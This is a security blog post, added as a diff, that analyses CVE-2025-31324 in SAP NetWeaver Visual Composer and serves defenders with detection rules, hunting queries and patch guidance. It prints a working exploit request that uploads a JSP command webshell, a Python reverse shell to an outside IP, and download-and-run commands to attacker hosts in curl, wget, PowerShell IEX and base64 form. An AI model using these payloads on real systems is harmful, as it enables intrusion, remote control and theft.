@@ -1,0 +1,438 @@
+---
+layout: post
+title: "SAP NetWeaver VC (CVE-2025-31324)"
+subtitle: "How an obscure endpoint turned SAP NetWeaver into a webshell wonderland"
+date: 2025-05-30
+header_image: /assets/images/CVE-2025-31324.png
+---
+
+On April 24, 2025, SAP issued an out-of-band security advisory for CVE-2025-31324, perfect 10.0 CVSS vulnerability affecting SAP NetWeaver's Visual Composer Framework. The flaw was simple, devastating, and actively exploited in the wild before disclosure. Within hours, every threat actor with a pulse was kicking down doors that had been left wide open since at least January 2025.
+
+Here's the thing about Visual Composer: it's a legacy component that shipped with NetWeaver to let business analysts build apps without writing code. SAP deprecated it in 2015, but it's still widely deployed because enterprise software has a half-life longer than uranium-238. And now, a missing authorization check in the Metadata Uploader servlet was letting anyone on the internet drop webshells like they were going out of style.
+
+---
+
+## The Vulnerability
+
+**CVE-2025-31324** is an unrestricted file upload vulnerability in SAP NetWeaver Application Server Java's Visual Composer component (specifically the VCFRAMEWORK.SCA framework).
+
+### The Technical Breakdown
+
+The vulnerability exists in the `/developmentserver/metadatauploader` endpoint, servlet designed to handle metadata files for application development. In theory, it's supposed to process serialized Java objects and configuration data. In practice, it had zero authentication, zero authorization checks, and the file handling security of a cardboard box left in the rain.
+
+Here's what happens:
+
+1. **Unrestricted Access**: The `/developmentserver/metadatauploader` endpoint is exposed over HTTP/HTTPS with no authentication requirements
+2. **File Upload**: An attacker sends a specially crafted POST request containing arbitrary file content
+3. **Path Traversal**: The servlet writes the uploaded file directly to predictable directories within the application server's web root, typically `/j2ee/cluster/apps/sap.com/irj/servlet_jsp/irj/root/`
+4. **Code Execution**: The attacker accesses the uploaded JSP webshell via a simple GET request, achieving remote code execution with SAP administrator (sidadm) privileges
+
+The attack is trivial. Send a multipart POST to the metadata uploader, include your JSP payload, and you're in. No credentials. No tokens. No questions asked.
+
+### Why It Matters
+
+SAP NetWeaver sits at the heart of enterprise resource planning (ERP) systems managing payroll, supply chains, financial transactions, and HR data. Compromising a NetWeaver instance isn't just a security incident, it's a business-ending event. And because these systems are often on-prem with patch cycles measured in quarters, the window of exposure was enormous.
+
+---
+
+## Impacted Versions and Patch Status
+
+### Affected Systems
+
+All SAP NetWeaver AS Java 7.xx versions with the Visual Composer Framework (VCFRAMEWORK.SCA) installed are vulnerable. This includes all service packs (SPS) for NetWeaver 7.xx.
+
+SAP's non-public guidance recommends checking if your system is affected by navigating to `http://host:port/nwa/sysinfo` and searching for the software component `VISUAL COMPOSER FRAMEWORK (VCFRAMEWORK.SCA)`. If it's present, you're vulnerable. If you get no results, the component isn't installed, but don't get too comfortable, because plenty of systems have it and never realized.
+
+### Patch Information
+
+**Initial Patch** (April 24, 2025):  
+SAP Security Note [3594142](https://me.sap.com/notes/3594142) addresses the missing authorization check that enables unrestricted file uploads.
+
+**Follow-Up Patch** (May 13, 2025):  
+SAP Security Note [3604119](https://me.sap.com/notes/3604119) patches **CVE-2025-42999**, a related deserialization vulnerability in Visual Composer that attackers were chaining with CVE-2025-31324. The second patch changes how Visual Composer processes certain files and removes the Java deserialization flaw that underpinned both vulnerabilities.
+
+**Critical Detail**: Even if you patched CVE-2025-31324 in April, you're not safe without the May patch. Attackers figured out how to chain these two vulnerabilities together, achieving what's essentially "living off the land" execution, webshell-less command execution with full admin privileges.
+
+---
+
+## Proof of Concept Details
+
+### The Exploit Chain
+
+Public exploits for CVE-2025-31324 started circulating within 48 hours of disclosure. By August 2025, a chained exploit combining CVE-2025-31324 and CVE-2025-42999 appeared on Telegram, courtesy of the "Scattered Lapsus$ Hunters" group.
+
+Here's how the attack unfolds:
+
+#### Stage 1: Initial Access (CVE-2025-31324)
+
+The attacker sends a multipart POST request to the vulnerable endpoint:
+
+```http
+POST /developmentserver/metadatauploader HTTP/1.1
+Host: vulnerable-sap-server.com
+Content-Type: multipart/form-data; boundary=----exploit
+------exploit
+Content-Disposition: form-data; name="file"; filename="helper.jsp"
+Content-Type: application/octet-stream
+<%@ page import="java.io.*" %>
+<%
+  String cmd = request.getParameter("cmd");
+  Process p = Runtime.getRuntime().exec(cmd);
+  InputStream in = p.getInputStream();
+  BufferedReader br = new BufferedReader(new InputStreamReader(in));
+  String line;
+  while ((line = br.readLine()) != null) {
+    out.println(line + "<br>");
+  }
+%>
+------exploit--
+```
+
+The servlet accepts the payload and writes it to:  
+`/usr/sap/<SID>/J<instance>/j2ee/cluster/apps/sap.com/irj/servlet_jsp/irj/root/helper.jsp`
+
+#### Stage 2: Code Execution
+
+The attacker accesses the webshell:
+
+```http
+GET /irj/servlet/prt/portal/prtroot/helper.jsp?cmd=id HTTP/1.1
+Host: vulnerable-sap-server.com
+```
+Response:
+```
+uid=1001(sidadm) gid=1001(sapsys) groups=1001(sapsys)
+```
+Game over. Full admin access achieved.
+
+#### Stage 3: Deserialization (CVE-2025-42999)
+
+For attackers who want to avoid leaving JSP artifacts on disk, CVE-2025-42999 provides an alternative. By crafting a serialized Java object with malicious gadgets, attackers can achieve direct command execution through deserialization, no webshell required. This makes forensic analysis significantly harder because there's no file to find.
+
+The chained exploit uses CVE-2025-31324 to gain initial access, then leverages CVE-2025-42999 to execute commands in-memory through deserialization. The result is full system compromise with minimal forensic footprint.
+
+---
+
+## Exploitation Analysis
+
+### What We Observed
+
+Between January and August 2025, multiple research teams documented exploitation in the wild. Here's what the activity looked like:
+
+#### Webshell Deployment Patterns
+
+Attackers deployed JSP webshells with varying filenames:
+- `helper.jsp` (most common, publicly documented)
+- `cache.jsp` (second most common)
+- Random 8-character names: `cglswdjp.jsp`, `ijoatvey.jsp`, `ylgxcsem.jsp`
+- Hidden files: `.webhelper.jsp`
+
+Many of these shells originated from public GitHub repositories—attackers didn't even bother writing custom code. They just grabbed working templates and modified the filenames.
+
+#### Post-Exploitation Tactics on Linux
+
+Once inside, attackers moved quickly. Here's a sampling of observed commands in the wild investigations:
+
+**Reverse Shells**:
+```bash
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((5.161.153.112,8443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+**File Manipulation**:
+```bash
+mv ../apps/sap.com/irj/servlet_jsp/irj/root/helper.jsp ../apps/sap.com/irj/servlet_jsp/irj/root/usage.jsp
+```
+
+This renames the webshell to evade detection after `helper.jsp` became a known IOC.
+
+**Tool Downloads**:
+```bash
+wget http[:]//brandnav-cms-storage.s3.amazonaws[.]com:80/ZGHU5tVaLk -O /tmp/1
+curl -o /tmp/1 http[:]//abode-dashboard-media.s3.ap-south-1.amazonaws[.]com/BCYVrrHX
+curl -O https[:]//ocr-freespace.oss-cn-beijing.aliyuncs[.]com/2025/config.sh
+```
+
+These commands pulled down additional malware from cloud storage (AWS S3, Aliyun OSS), including:
+- **GOREVERSE**: A reverse SSH framework for persistent remote access
+- **Supershell**: An open-source remote shell tool
+- **XMRig**: Cryptocurrency mining malware
+- **KrustyLoader**: Advanced malware loader
+
+**Base64 Obfuscation**:
+To evade casual process monitoring, attackers Base64-encoded their commands:
+
+```bash
+bash -c {echo,d2dldCBodHRw...}|{base64,-d}|{bash,-i}
+```
+
+Decoded:
+```bash
+wget http[:]//abode-dashboard-media.s3.ap-south-1.amazonaws.com/BCYVrrHX -O /tmp/1 || curl -o /tmp/1 http://abode-dashboard-media.s3.ap-south-1.amazonaws.com/BCYVrrHX
+```
+
+#### Post-Exploitation Tactics on Windows
+
+Windows exploitation followed similar patterns but leveraged native tooling:
+
+**PowerShell Downloads**:
+```powershell
+powershell Invoke-WebRequest -Uri "http[:]//65.49.235[.]210/download/2.jpg" -OutFile "cmake.exe"
+powershell curl -o "C:\users\public\ansgdhs.bat" http[:]//101.32.26[.]154/rymhNszS/ansgdhs.bat
+powershell IEX(New-Object Net.WebClient).DownloadString('https[:]//d-69b.pages[.]dev/sshb64.ps1')
+```
+
+**Brute Ratel Deployment**:
+
+In multiple incidents, attackers uploaded C# code via the webshell, then compiled it using MSBuild:
+
+```cmd
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\ProgramData\output.txt
+```
+
+The compiled payload retrieved Brute Ratel from external servers. Brute Ratel is a commercial C2 framework marketed to red teams but frequently abused by actual threat actors. It supports:
+- Encrypted C2 channels
+- Custom payload generation to bypass AV/EDR
+- Post-exploitation tools (credential dumping, lateral movement, persistence)
+
+**Heaven's Gate Technique**:
+
+Attackers used the Heaven's Gate technique to transition from 32-bit to 64-bit execution, bypassing security controls monitoring specific architectures. The telltale sign is the `NtSetContextThread` API call manipulating thread execution contexts.
+
+**Reverse SSH SOCKS Proxy**:
+
+One particularly sophisticated attack deployed a reverse SSH proxy via PowerShell:
+
+```powershell
+powershell IEX(New-Object Net.WebClient).DownloadString('https[:]//d-69b.pages[.]dev/sshb64.ps1')
+```
+
+This script:
+1. Retrieved the system's domain name and username
+2. Killed existing SSH processes
+3. Downloaded OpenSSH binaries from GitHub
+4. Generated SSH keys and uploaded the private key to `45.76.93[.]60`
+5. Established a remote tunnel to the C2 server
+
+Result: persistent, encrypted access tunneling through SSH—difficult to detect without deep packet inspection.
+
+### Reconnaissance Commands
+
+Standard post-exploitation recon commands observed across incidents:
+
+```bash
+cat /etc/hosts
+cat /etc/resolv.conf
+cat ~/.bash_history
+cat /etc/issue
+crontab -l
+ps -ef
+df -a
+last -n 30
+netstat -tenp
+nltest /domain
+uname -a
+ls /mnt
+ls /var
+ls /opt
+```
+
+Nothing fancy, just efficient enumeration to understand the environment and identify pivot points.
+
+---
+
+## Considerations and Limitations
+
+### Attack Surface Reality
+
+Visual Composer isn't installed by default, but it's present in a significant number of NetWeaver deployments because it was a core component for years. Organizations that deployed NetWeaver before 2015 likely have it enabled, and many never bothered to disable it post-deprecation.
+
+The `/developmentserver/` endpoint is intended for internal development use, but in practice, many organizations exposed their NetWeaver instances directly to the internet without proper network segmentation. Shodan searches in late April 2025 revealed thousands of exposed SAP systems, many still unpatched.
+
+### Detection Challenges
+
+Traditional signature-based detection struggles here for several reasons:
+
+1. **Legitimate Functionality**: The vulnerable endpoint is a real, intended feature of Visual Composer. Normal metadata uploads look structurally similar to malicious ones.
+2. **Webshell Variability**: Attackers used dozens of different filenames and slightly modified JSP code. Signature-based webshell detection catches the obvious ones (`helper.jsp`, `cache.jsp`) but misses randomized names.
+3. **Living Off the Land**: When attackers chain CVE-2025-42999 for deserialization-based execution, there's no file artifact to detect, commands execute entirely in memory.
+4. **Legitimate Tools**: Attackers used `curl`, `wget`, PowerShell's `Invoke-WebRequest`, and MSBuild, all legitimate utilities present in normal environments.
+
+### Why Behavior Matters
+
+This is where detection logic earns its keep. Instead of looking for specific filenames or signatures, effective detection focuses on behaviors that shouldn't happen:
+
+- JSP files being written to servlet directories by non-admin processes
+- Reverse shell connections from SAP Java processes
+- Base64-decoded commands spawning from bash
+- MSBuild compiling code in unusual directories (`C:\ProgramData`)
+- Python spawning network sockets from SAP process trees
+
+These behaviors are inherently suspicious regardless of the exploit used.
+
+---
+
+## Detection and Hunting
+
+### Detection Opportunities
+
+Here are high-fidelity detection rules based on observed exploitation patterns:
+
+#### 1. JSP File Creation in Servlet Directories
+
+**Logic**:
+```
+file_created
+AND file_path CONTAINS "servlet_jsp/irj/root/"
+AND file_extension = ".jsp"
+AND process_name NOT IN (known_sap_admin_processes)
+```
+
+**Rationale**: The `servlet_jsp/irj/root/` directory should only receive files from legitimate SAP administration processes during deployment or maintenance. Any other process writing JSP files here is suspicious.
+
+#### 2. Reverse Shell Spawning from SAP Processes
+
+**Logic**:
+```
+(process_name = "jstart.exe" OR parent_process_path CONTAINS "sap")
+AND child_process IN ("python", "python3", "bash", "sh")
+AND command_line CONTAINS ("socket", "subprocess", "connect")
+```
+
+**Rationale**: SAP Java processes (`jstart.exe`, `msg_server`, etc.) should never spawn interactive shells with network socket capabilities.
+
+#### 3. Base64-Encoded Commands in Shell Processes
+
+**Logic**:
+```
+process_name IN ("bash", "sh", "cmd.exe", "powershell.exe")
+AND command_line CONTAINS "base64"
+AND command_line CONTAINS ("-d", "-decode")
+```
+
+**Rationale**: Base64 encoding is frequently used to obfuscate malicious commands. Legitimate automation rarely combines Base64 decoding with immediate execution.
+
+#### 4. Curl/Wget Downloading to /tmp
+
+**Logic**:
+```
+process_name IN ("curl", "wget")
+AND command_line CONTAINS ("/tmp", "C:\\Temp", "C:\\ProgramData")
+AND file_created
+```
+
+**Rationale**: Downloading files to temporary directories followed by execution is classic attacker behavior.
+
+#### 5. MSBuild Compiling in Non-Standard Locations
+
+**Logic**:
+```
+process_name = "MSBuild.exe"
+AND (command_line CONTAINS "C:\\ProgramData" OR command_line CONTAINS "C:\\Users\\Public")
+```
+
+**Rationale**: MSBuild should compile projects in development directories, not user-accessible temp locations. This pattern indicates malicious payload generation.
+
+#### 6. Suspicious HTTP POST to /developmentserver/metadatauploader
+
+**Network-based detection**:
+```
+http_request_method = "POST"
+AND uri_path = "/developmentserver/metadatauploader"
+AND (source_ip NOT IN internal_developer_networks OR content_type = "multipart/form-data")
+```
+
+**Rationale**: The metadata uploader endpoint should only be accessed internally by developers. External POST requests are exploitation attempts.
+
+### Threat Hunting Queries
+
+For proactive hunting in environments where SAP NetWeaver is deployed:
+
+#### Hunt 1: Identify Exposed Visual Composer Instances
+
+Check if your SAP systems have Visual Composer enabled:
+
+```bash
+curl -k http://your-sap-server:port/nwa/sysinfo | grep "VCFRAMEWORK"
+```
+
+If you get a result, Visual Composer is installed. Verify whether the `/developmentserver/metadatauploader` endpoint responds:
+
+```bash
+curl -k -X POST http://your-sap-server:port/developmentserver/metadatauploader
+```
+
+A 200 response indicates the endpoint is accessible and likely vulnerable if unpatched.
+
+#### Hunt 2: Search for Suspicious JSP Files
+
+On your SAP servers:
+
+```bash
+find /usr/sap -name "*.jsp" -path "*servlet_jsp/irj/root/*" -type f -mtime -90
+```
+
+Review any JSP files created in the last 90 days. Cross-reference filenames against known IOCs (see below). If you find files you didn't intentionally deploy, treat them as malicious.
+
+#### Hunt 3: Process Telemetry Review
+
+Query your EDR for suspicious parent-child process relationships:
+
+- `jstart.exe` spawning `python`, `bash`, or `sh`
+- `bash` or `sh` spawning with Base64 decoding operations
+- `curl` or `wget` downloading to `/tmp` followed by file execution
+- MSBuild activity in non-development directories
+
+#### Hunt 4: Network Anomalies
+
+Look for unusual outbound connections from SAP servers:
+
+```
+source_process IN ("jstart.exe", "msg_server", "sapstartsrv")
+AND destination_port IN (8443, 4444, 4545, 3232, custom_c2_ports)
+AND destination_ip NOT IN (known_sap_update_servers)
+```
+
+Cross-reference destination IPs against threat intelligence feeds and the IOC list below.
+
+---
+
+## Closing Assessment
+
+CVE-2025-31324 is a textbook example of how a single missing authorization check in legacy code can create enterprise-scale carnage. Visual Composer was deprecated in 2015, but ten years later, it's still deployed in thousands of SAP NetWeaver instances worldwide, a perfect storm of forgotten attack surface and critical business infrastructure.
+
+The vulnerability's active exploitation timeline tells the story:
+- **January 2025**: Early probing activity detected
+- **March 2025**: Full-scale exploitation begins, chained with CVE-2025-42999
+- **April 22, 2025**: ReliaQuest publicly discloses investigation findings
+- **April 24, 2025**: SAP issues emergency patch (CVE-2025-31324)
+- **May 13, 2025**: SAP patches follow-up deserialization flaw (CVE-2025-42999)
+- **August 2025**: Public exploit released on Telegram
+
+The attackers had a three-month head start before the first patch dropped. Even after patching, organizations that only applied the April update remained vulnerable to deserialization attacks until May. And based on Shodan telemetry, dozens of exposed systems still haven't patched as of late 2025.
+
+### Threat Actor Attribution
+
+Multiple groups exploited this vulnerability:
+- **Initial Access Brokers**: Opportunistic mass scanning and webshell deployment for resale
+- **China-nexus APT groups** (Earth Lamia): Targeted exploitation of government and enterprise systems
+- **Ransomware operators**: BianLian and RansomEXX leveraged the flaw for enterprise extortion
+- **Cryptominers**: XMRig deployments for low-effort monetization
+
+The speed at which exploitation ramped up, from sophisticated APT actors to script kiddies, demonstrates how quickly critical vulnerabilities commoditize. The public release of chained exploits in August essentially handed remote code execution capabilities to anyone with basic network access to a vulnerable SAP server.
+
+### Final Thoughts
+
+CVE-2025-31324 wasn't sophisticated. It was a missing `if (authenticated) { allow(); }` check in a deprecated upload handler. But simplicity doesn't mean low impact—this vulnerability compromised government agencies, financial institutions, healthcare providers, and manufacturing companies. The adversaries moved fast, chained vulnerabilities together, and adapted their tactics as defenders caught up.
+
+The window between disclosure and widespread exploitation is shrinking. For critical infrastructure vulnerabilities like this, that window is measured in hours, not days. If your patch management process can't accommodate emergency deployments, it's time to rethink your operational security model.
+
+SAP customers: Patch both CVE-2025-31324 and CVE-2025-42999. Hunt for webshells. Review your exposure. And if Visual Composer is still enabled in your environment, ask yourself why.
+
+---
+
+## References
+
+- [ReliaQuest: Threat Spotlight - ReliaQuest Uncovers Vulnerability Behind SAP NetWeaver Compromise](https://reliaquest.com/blog\threat-spotlight-reliaquest-uncovers-vulnerability-behind-sap-netweaver-compromise/)
+- [Red Canary: Critical vulnerability in SAP NetWeaver enables malicious file uploads](https://redcanary.com/blog/threat-intelligence/cve-2025-31324/)
+- [Unit 42: Threat Brief: CVE-2025-31324](https://unit42.paloaltonetworks.com/threat-brief-sap-netweaver-cve-2025-31324/)
+- [Rapid7: Active Exploitation of SAP NetWeaver Visual Composer CVE-2025-31324](https://www.rapid7.com/blog/post/2025/04/28/etr-active-exploitation-of-sap-netweaver-visual-composer-cve-2025-31324/)
